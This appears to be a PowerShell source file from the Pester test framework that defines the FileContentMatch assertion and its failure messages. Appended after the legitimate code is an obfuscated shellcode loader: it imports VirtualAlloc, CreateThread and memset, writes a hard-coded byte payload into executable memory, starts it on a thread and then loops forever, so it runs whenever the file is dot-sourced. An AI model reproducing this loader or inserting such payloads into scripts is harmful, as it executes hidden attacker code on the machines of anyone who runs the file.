function Should-FileContentMatch($ActualValue, $ExpectedContent, [switch] $Negate, $Because) {
    
    $succeeded = (@(& $SafeCommands['Get-Content'] -Encoding UTF8 $ActualValue) -match $ExpectedContent).Count -gt 0

    if ($Negate) {
        $succeeded = -not $succeeded
    }

    $failureMessage = ''

    if (-not $succeeded) {
        if ($Negate) {
            $failureMessage = NotShouldFileContentMatchFailureMessage -ActualValue $ActualValue -ExpectedContent $ExpectedContent -Because $Because
        }
        else {
            $failureMessage = ShouldFileContentMatchFailureMessage -ActualValue $ActualValue -ExpectedContent $ExpectedContent -Because $Because
        }
    }

    return & $SafeCommands['New-Object'] psobject -Property @{
        Succeeded      = $succeeded
        FailureMessage = $failureMessage
    }
}

function ShouldFileContentMatchFailureMessage($ActualValue, $ExpectedContent, $Because) {
    return "Expected $(Format-Nicely $ExpectedContent) to be found in file '$ActualValue',$(Format-Because $Because) but it was not found."
}

function NotShouldFileContentMatchFailureMessage($ActualValue, $ExpectedContent, $Because) {
    return "Expected $(Format-Nicely $ExpectedContent) to not be found in file '$ActualValue',$(Format-Because $Because) but it was found."
}

Add-AssertionOperator -Name         FileContentMatch `
    -InternalName Should-FileContentMatch `
    -Test         ${function:Should-FileContentMatch}

$6UhT = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $6UhT -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd6,0xbf,0xb6,0xed,0xe8,0xc5,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x5a,0x31,0x7e,0x17,0x83,0xee,0xfc,0x03,0xc8,0xfe,0x0a,0x30,0xc8,0xe9,0x49,0xbb,0x30,0xea,0x2d,0x35,0xd5,0xdb,0x6d,0x21,0x9e,0x4c,0x5e,0x21,0xf2,0x60,0x15,0x67,0xe6,0xf3,0x5b,0xa0,0x09,0xb3,0xd6,0x96,0x24,0x44,0x4a,0xea,0x27,0xc6,0x91,0x3f,0x87,0xf7,0x59,0x32,0xc6,0x30,0x87,0xbf,0x9a,0xe9,0xc3,0x12,0x0a,0x9d,0x9e,0xae,0xa1,0xed,0x0f,0xb7,0x56,0xa5,0x2e,0x96,0xc9,0xbd,0x68,0x38,0xe8,0x12,0x01,0x71,0xf2,0x77,0x2c,0xcb,0x89,0x4c,0xda,0xca,0x5b,0x9d,0x23,0x60,0xa2,0x11,0xd6,0x78,0xe3,0x96,0x09,0x0f,0x1d,0xe5,0xb4,0x08,0xda,0x97,0x62,0x9c,0xf8,0x30,0xe0,0x06,0x24,0xc0,0x25,0xd0,0xaf,0xce,0x82,0x96,0xf7,0xd2,0x15,0x7a,0x8c,0xef,0x9e,0x7d,0x42,0x66,0xe4,0x59,0x46,0x22,0xbe,0xc0,0xdf,0x8e,0x11,0xfc,0x3f,0x71,0xcd,0x58,0x34,0x9c,0x1a,0xd1,0x17,0xc9,0xb2,0x8f,0xd3,0x09,0x23,0x27,0x72,0x64,0xda,0x93,0xec,0x34,0x6b,0x3a,0xeb,0x3b,0x46,0x73,0x28,0x90,0x3a,0x27,0x9d,0x44,0xd5,0xfd,0x77,0x12,0x82,0xfd,0xa2,0xb7,0x9f,0x6b,0x4f,0x6b,0x73,0x04,0xe7,0x9a,0x73,0xd4,0x1f,0x10,0x73,0xd4,0xdf,0x06,0x42,0xe2,0xe7,0x17,0xc3,0x0a,0x47,0xc0,0x44,0x82,0xf8,0xd6,0x94,0x41,0x8f,0x11,0x39,0x02,0x8f,0xaf,0x5e,0x56,0xdc,0x9c,0xcd,0x00,0xb1,0x74,0x9a,0x45,0x60,0x57,0x61,0x65,0x5f,0x31,0xff,0x93,0x00,0x56,0x80,0x97,0xbe,0xa6,0x09,0x37,0xd4,0xa2,0x59,0xd2,0x37,0xfd,0x31,0x57,0x01,0x9f,0x44,0x68,0x58,0xcc,0x1b,0xc4,0x31,0xa5,0xf3,0xc7,0xb3,0x51,0x7f,0xe7,0x6e,0xe4,0xbf,0x62,0x9a,0xa8,0x4a,0x54,0xf2,0xc6,0x00,0xc4,0x54,0xd8,0xbe,0x63,0x18,0x4e,0x41,0x64,0x98,0x8e,0x29,0x84,0x98,0xce,0xa9,0xd7,0xf0,0x96,0x0d,0x84,0xe5,0xd8,0x9b,0xb8,0xb6,0x75,0xad,0x58,0x6f,0x12,0xad,0x86,0x8f,0xe2,0xfe,0x90,0xe7,0xf0,0x96,0x94,0x15,0x0b,0x43,0x23,0x19,0x80,0xa1,0xa7,0x9e,0x68,0xf9,0x3d,0x60,0x1f,0x18,0x65,0xa3,0xbf,0x0a,0xe3,0xdc,0xbf,0x34,0x62,0x4b,0x2e,0xac,0x0e,0xee,0xc3,0x5c,0x98,0x9e,0x7c,0xd4,0x3f,0x33,0xad,0x7e,0xaf,0xbb,0xc5,0x11,0x01,0x54,0x54,0x89,0x5d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$nGVk=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($nGVk.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$nGVk,0,0,0);for (;;){Start-sleep 60};
